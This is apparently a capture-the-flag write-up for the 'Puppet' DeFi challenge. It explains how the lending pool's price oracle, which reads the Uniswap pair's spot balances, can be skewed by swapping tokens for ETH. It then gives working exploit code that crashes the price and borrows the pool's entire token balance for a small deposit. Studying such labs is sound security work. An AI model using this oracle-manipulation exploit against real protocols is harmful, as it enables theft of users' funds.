# Puppet

1. The `PuppetPool.sol` calculate the deposit required by using `_computeOraclePrice` which depend on `uniswapPair.balance` and `token.balanceOf(uniswapPair)`. We can manipulate the deposit requirement to be as low as possible by draining the `uniswapPair.balance` and make `token.balanceOf(uniswapPair` high by swaping our token to ETH in uniswapPair.

2. You can calculate the price required by using the code.

```javascript
/** CODE YOUR EXPLOIT HERE */
await this.token
  .connect(attacker)
  .approve(this.uniswapExchange.address, ethers.utils.parseEther("999"));
await this.uniswapExchange
  .connect(attacker)
  .tokenToEthSwapInput(
    ethers.utils.parseEther("999"),
    1,
    (await ethers.provider.getBlock("latest")).timestamp * 2
  );
await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, {
  value: ethers.utils.parseEther("20"),
});
```
